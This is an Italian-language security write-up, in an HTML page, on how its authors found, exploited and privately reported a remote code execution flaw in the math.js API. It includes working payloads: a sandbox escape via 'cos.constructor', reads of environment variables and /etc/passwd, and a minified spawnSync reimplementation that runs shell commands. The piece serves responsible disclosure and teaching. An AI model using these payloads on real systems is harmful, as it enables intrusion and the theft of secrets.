<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="generator" content="pandoc">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <meta name="author" content="CapacitorSet">
  <title>How we exploited a remote execution vulnerability in math.js</title>
  <style type="text/css">
    /* Source: https://bestmotherfucking.website (with changes) */
    body {
      margin: 0 auto;
      max-width: 40em;
      padding: 1rem .62em;
      font-size: 1.2em;
      line-height: 1.62;
      font-family: "Open Sans", sans-serif;
    }
    h1, h2, h3 {
      line-height: 1.2;
    }
    blockquote {
      background-color: #eee;
      border-left: 6px solid silver;
      padding: 0.1em 1em 0.1em 1em;
      margin: 0;
    }
    pre {
      padding: 0.5rem 1rem;
      background-color: #f8f8f8;
      border: 1px solid #eee;
      border-radius: 0.15rem;
      margin-bottom: 1rem;
      overflow: auto;
    }
    a, a:visited {
      color: #07a;
    }

    @media print {
      body {
        max-width: none
      }
    }
  </style>
</head>
<body>
<h1 id="come-abbiamo-exploitato-una-vulnerabilità-di-remote-code-execution-in-math.js">Come abbiamo exploitato una vulnerabilità di remote code execution in math.js</h1>
<p>Questo articolo spiega in breve come abbiamo trovato, exploitato e segnalato una vulnerabilità di remote code execution (RCE). È fatto per essere una guida su come trovare vulnerabilità, e come segnalarle in modo responsabile.</p>
<h2 id="prima-fase-scoperta">Prima fase: scoperta</h2>
<p>Sperimentando con <a href="https://github.com/LucentW/s-uzzbot/blob/master/plugins/calculator.lua">un wrapper</a> dell'API math.js (<code>http://api.mathjs.org/v1/?expr=expression-here</code>), abbiamo scoperto che <strong>sembra eseguire del codice JavaScript</strong>, anche se con alcune restrizioni:</p>
<pre><code>&gt; !calc cos
Result: function

&gt; !calc eval
Result: function

&gt; !calc eval(&quot;x =&gt; x&quot;)
Error: Value expected (char 3)

&gt; !calc eval(&quot;console.log&quot;)
Error: Undefined symbol console

&gt; !calc eval(&quot;return 1&quot;)
Result: 1</code></pre>
<p>In particolare, sembra che <code>eval</code> sia stato sostituito con una versione sicura. Neanche <code>Function</code> e <code>setTimeout</code> funzionano:</p>
<pre><code>&gt; !calc Function(&quot;return 1&quot;)
Error: Undefined symbol Function

&gt; !calc setTimeout
Error: Undefined symbol Function</code></pre>
<h2 id="seconda-fase-exploit">Seconda fase: exploit</h2>
<blockquote>
<p>Dopo aver capito che ci sono delle restrizioni sull'esecuzione del codice, abbiamo dovuto capire come aggirarle.</p>
</blockquote>
<p>In JavaScript ci sono quattro modi di <strong>eseguire delle stringhe</strong>:</p>
<ul>
<li><a href="https://developer.mozilla.org/it/docs/Web/JavaScript/Reference/Global_Objects/eval"><code>eval(&quot;codice&quot;)</code></a></li>
<li><a href="https://developer.mozilla.org/it/docs/Web/JavaScript/Reference/Global_Objects/Function"><code>new Function(&quot;codice&quot;)</code></a></li>
<li><a href="https://developer.mozilla.org/it/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout"><code>setTimeout(&quot;code&quot;, timeout)</code></a></li>
<li><a href="https://developer.mozilla.org/it/docs/Web/API/WindowOrWorkerGlobalScope/setInterval"><code>setInterval(&quot;code&quot;, interval)</code></a></li>
</ul>
<p>Nell'ambiente math.js, non possiamo accedere direttamente a queste funzioni, o perché non sono definite o perché sono state ridefinite perché siano sicure. Tuttavia, ci si può accedere indirettamente: in particolare, <strong>si puà accedere indirettamente a <code>Function</code> come construttore di una funzione esistente</strong> - questa è stata l'intuizione chiave che ha portato all'exploit.</p>
<blockquote>
<p>Per esempio, <code>Function(&quot;return 1&quot;)</code> può essere sostituito con <code>Math.floor.constructor(&quot;return 1&quot;)</code>. Perciò, per eseguire <code>return 1</code>, possiamo usare <code>Math.floor.constructor(&quot;return 1&quot;)()</code>.</p>
</blockquote>
<p>Sappiamo che in math.js <code>cos</code> è definito come una funzione, per cui l'abbiamo usata:</p>
<pre><code>&gt; !calc cos.constructor(&quot;return 1&quot;)()
Result: 1</code></pre>
<p>Funziona!</p>
<p>Da qua avremmo potuto semplicemente usare <code>require</code> con dei moduli nativi e avere accesso al sistema operativo, giusto? Purtroppo no: nonostante il server dell'API math.js giri in un ambiente Node.js, per qualche motivo non possiamo usare <code>require</code>.</p>
<pre><code>&gt; !calc cos.constructor(&quot;return require&quot;)()
Error: require is not defined</code></pre>
<p>Tuttavia abbiamo potuto usare <code>process</code>, che ha <a href="https://nodejs.org/api/process.html">diverse funzionalità carine</a>:</p>
<pre><code>&gt; !calc cos.constructor(&quot;return process&quot;)()
Result: [object process]

&gt; !calc cos.constructor(&quot;return process.env&quot;)()
Result: {
  &quot;WEB_MEMORY&quot;: &quot;512&quot;,
  &quot;MEMORY_AVAILABLE&quot;: &quot;512&quot;,
  &quot;NEW_RELIC_LOG&quot;: &quot;stdout&quot;,
  &quot;NEW_RELIC_LICENSE_KEY&quot;: &quot;&lt;censurato&gt;&quot;,
  &quot;DYNO&quot;: &quot;web.1&quot;,
  &quot;PAPERTRAIL_API_TOKEN&quot;: &quot;&lt;censurato&gt;&quot;,
  &quot;PATH&quot;: &quot;/app/.heroku/node/bin:/app/.heroku/yarn/bin:bin:node_modules/.bin:/usr/local/bin:/usr/bin:/bin:/app/bin:/app/node_modules/.bin&quot;,
  &quot;WEB_CONCURRENCY&quot;: &quot;1&quot;,
  &quot;PWD&quot;: &quot;/app&quot;,
  &quot;NODE_ENV&quot;: &quot;production&quot;,
  &quot;PS1&quot;: &quot;\[\033[01;34m\]\w\[\033[00m\] \[\033[01;32m\]$ \[\033[00m\]&quot;,
  &quot;SHLVL&quot;: &quot;1&quot;,
  &quot;HOME&quot;: &quot;/app&quot;,
  &quot;PORT&quot;: &quot;&lt;censurato&gt;&quot;,
  &quot;NODE_HOME&quot;: &quot;/app/.heroku/node&quot;,
  &quot;_&quot;: &quot;/app/.heroku/node/bin/node&quot;
}</code></pre>
<p>Nonostante <code>process.env</code> contenga alcune informazioni interessanti, non possiamo usarlo per fare nulla di interessante: dobbiamo andare più in fondo e usare <a href="http://stackoverflow.com/q/24042861"><code>process.binding</code></a>, che esponde dei binding Javascript all'OS. Nonostante non siano presenti nella documentazione ufficiale, si può determinare il loro funzionamento leggendo il codice sorgente di Node.js. Ad esempio, possiamo usare <code>process.binding(&quot;fs&quot;)</code> per leggere qualsiasi file sul disco (se abbiamo i permessi necessari):</p>
<blockquote>
<p>Per brevità, salteremo il wrapper <code>!calc cos.constructor(&quot;code&quot;)</code>, e presenteremo solo il codice JS.</p>
</blockquote>
<pre><code>&gt; buffer = Buffer.allocUnsafe(8192); process.binding(&#39;fs&#39;).read(process.binding(&#39;fs&#39;).open(&#39;/etc/passwd&#39;, 0, 0600), buffer, 0, 4096); return buffer
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
&lt;more users...&gt;</code></pre>
<p>Abbiamo quasi finito: dobbiamo solo capire come aprire una shell ed eseguire un qualsiasi comando. Chi ha esperienza con Node.js sarà a conoscenza di <a href="https://nodejs.org/api/child_process.html"><code>child_process</code></a>, che può essere usato per spawnare processi tramite <code>spawnSync</code>: dobbiamo solo re-implementare <code>child_process</code> usando i binding al SO (ricordiamo che non possiamo usare <code>require</code>).</p>
<p>È più facile di quanto sembri: basta prendere <a href="https://github.com/nodejs/node/blob/master/lib/child_process.js">il codice sorgente di <code>child_process</code></a>, rimuovere il codice che non ci serve (funzioni inutilizzate e gestione degli errori), minificarlo ed eseguirlo nell'API.</p>
<script src="https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822.js"></script>
<noscript>
<pre><code>// Source: https://github.com/nodejs/node/blob/master/lib/child_process.js

// Defines spawn_sync and normalizeSpawnArguments (without error handling). These are internal variables.
spawn_sync = process.binding(&#39;spawn_sync&#39;); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;&amp;(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(&#39; &#39;);typeof a.shell===&#39;string&#39;?c=a.shell:c=&#39;/bin/sh&#39;,b=[&#39;-c&#39;,g];}typeof a.argv0===&#39;string&#39;?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+&#39;=&#39;+d[f]);return{file:c,args:b,options:a,envPairs:e};}

// Defines spawnSync, the function that will do the actual spawning
spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:&#39;pipe&#39;,readable:!0,writable:!1},{type:&#39;pipe&#39;,readable:!1,writable:!0},{type:&#39;pipe&#39;,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c&lt;a.stdio.length;c++){var e=a.stdio[c]&amp;&amp;a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&amp;&amp;a.encoding&amp;&amp;a.encoding!==&#39;buffer&#39;)for(c=0;c&lt;b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&amp;&amp;b.output[1],b.stderr=b.output&amp;&amp;b.output[2],b.error&amp;&amp;(b.error= b.error + &#39;spawnSync &#39;+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}</code></pre>
<small>Gist [qui](https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822</small>
</noscript>
<p>Una volta fatto questo, <strong>possiamo spawnare un qualsiasi processo</strong> ed eseguire comandi nella shell:</p>
<pre><code>&gt; spawnSync(&#39;/usr/bin/whoami&#39;);
{
  &quot;status&quot;: 0,
  &quot;signal&quot;: null,
  &quot;output&quot;: [null, u15104, ],
  &quot;pid&quot;: 100,
  &quot;stdout&quot;: u15104,
  &quot;stderr&quot;:
}</code></pre>
<h2 id="fase-tre-segnalazione">Fase tre: segnalazione</h2>
<p>Dopo aver trovato una vulnerabilità e l'abbiamo sfruttata al massimo, abbiamo dovuto decidere cosa farci. Poiché l'abbiamo exploitata per divertimento e non abbiamo scopi criminali, abbiamo scelto di fare i &quot;white hat&quot; e di segnalarlo all'autore. L'abbiamo <strong>contattato in privato</strong> tramite l'indirizzo e-mail sul suo profilo GitHub con questi dettagli:</p>
<ul>
<li>una breve descrizione della vulnerabilità (una RCE in mathjs.eval);</li>
<li>un <strong>attacco di esempio</strong> con una spiegazione di come funzionasse (una spiegazione del perché <code>cos.constructor(&quot;code&quot;)()</code> funzionasse e di cosa si potesse fare con <code>process.bindings</code>);</li>
<li>una <strong>dimostrazione</strong> sul server live (abbiamo incluso l'output di <code>whoami</code> e <code>uname -a</code>);</li>
<li>suggerimenti su <strong>come sistemare la vulnerabilità</strong> (ad esempio, usando <a href="https://nodejs.org/api/vm.html">il modulo <code>vm</code> in Node.js</a>).</li>
</ul>
<p>Abbiamo lavorato con l'autore per due giorni per aiutarlo a sistemare la vulnerabilità. In particolare, dopo la fix inclusa in <a href="https://github.com/josdejong/mathjs/commit/2f456009056bc332673f45ca143d4d92c8c7b159"><code>2f45600</code></a> abbiamo trovato un altro modo di aggirarla (se non si può usare direttamente il costruttore, basta usare <code>cos.constructor.apply(null, &quot;code&quot;)()</code>) che è stato sistemato in <a href="https://github.com/josdejong/mathjs/commit/3c3517daa6412457826b79b60368d8e8e415a7dd"><code>3c3517d</code></a>.</p>
<h3 id="timeline">Timeline</h3>
<ul>
<li>26 Marzo 2017 22:20 CEST: primo exploit avvenuto con successo</li>
<li>29 Marzo 2017 14:43 CEST: la vulnerabilità è stata segnalata all'autore</li>
<li>31 Marzo 2017 12:35 CEST: la seconda vulnerabilità (<code>.apply</code>) è stata segnalata</li>
<li>31 Marzo 2017 13:52 CEST: sono state sistemate entrambe le vulnerabilità</li>
</ul>
<hr />
<blockquote>
<p>La vulnerabilità è stata scoperta da <a href="https://github.com/CapacitorSet">@CapacitorSet</a> e <a href="https://github.com/denysvitali">@denysvitali</a>. Ringraziamo <a href="https://github.com/josdejong/">@josdejong</a> per aver fixato la vulnerabilità con prontezza, e <a href="http://www.jsfuck.com/">JSFuck</a> per aver scoperto il trucco di usare <code>[].filter.constructor</code>.</p>
<p><small>Rilasciato sotto la licenza <a href="https://creativecommons.org/licenses/by/4.0/"><strong>CC-BY 4.0</strong></a>.</p>
</blockquote>
<script type="text/javascript">
  // Self-hosted Piwik tracking

  var _paq = _paq || [];
  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
  _paq.push(["setDocumentTitle", document.domain + "/" + document.title]);
  _paq.push(["setCookieDomain", "*.capacitorset.github.io"]);
  _paq.push(["setDomains", ["*.capacitorset.github.io","*.capacitorset.github.io"]]);
  _paq.push(['trackPageView']);
  _paq.push(['enableLinkTracking']);
  (function() {
    var u="//piwik.vps.denv.it/";
    _paq.push(['setTrackerUrl', u+'piwik.php']);
    _paq.push(['setSiteId', '4']);
    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
  })();
</script>
<noscript><p><img src="//piwik.vps.denv.it/piwik.php?idsite=4&rec=1" style="border:0;" alt="" /></p></noscript>
</body>
</html>